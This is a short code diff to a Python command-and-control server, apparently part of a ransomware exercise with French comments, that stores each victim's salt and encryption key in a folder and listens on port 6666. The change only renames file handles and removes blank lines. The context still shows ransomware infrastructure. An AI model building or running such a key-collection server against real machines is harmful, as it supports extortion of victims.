@@ -27,10 +27,10 @@ class CNC(CNCBase):
         os.mkdir(victim_dir) # création du dossier du victime
 
         # sauvegarde du sel et de la clé dans le dossier du victime
-        with open(os.path.join(victim_dir, "salt"), "wb") as f:
-            f.write(base64.b64decode(salt)) 
-        with open(os.path.join(victim_dir, "key"), "wb") as f:
-            f.write(base64.b64decode(key)) 
+        with open(os.path.join(victim_dir, "salt"), "wb") as salt_f:
+            salt_f.write(base64.b64decode(salt)) 
+        with open(os.path.join(victim_dir, "key"), "wb") as key_f:
+            key_f.write(base64.b64decode(key)) 
         
         # retourne un dictionnaire contenant le status de la requête (succès ou erreur)
         if os.path.isdir(victim_dir):
@@ -39,9 +39,5 @@ class CNC(CNCBase):
             return {"status":"Error"}
                    
         
-
-
-
-           
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
 httpd.serve_forever()
